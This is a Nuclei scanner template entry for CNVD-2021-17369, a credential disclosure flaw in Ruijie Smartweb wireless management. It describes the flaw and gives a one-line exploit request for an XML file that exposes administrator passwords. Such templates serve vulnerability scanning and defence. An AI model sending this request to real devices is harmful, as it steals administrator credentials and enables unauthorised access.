# Nuclei Template: Ruijie Smartweb Management System Password Information Disclosure
**Template ID:** CNVD-2021-17369
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`CNVD-2021-17369.yaml`)

## Vulnerability Information & PoC

## Description
The wireless smartweb management system of Ruijie Networks Co., Ltd. has a logic flaw. An attacker can obtain the administrator account and password from a low-privileged user, thereby escalating the low-level privilege to the administrator's privilege.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/web/xml/webuser-auth.xml
```
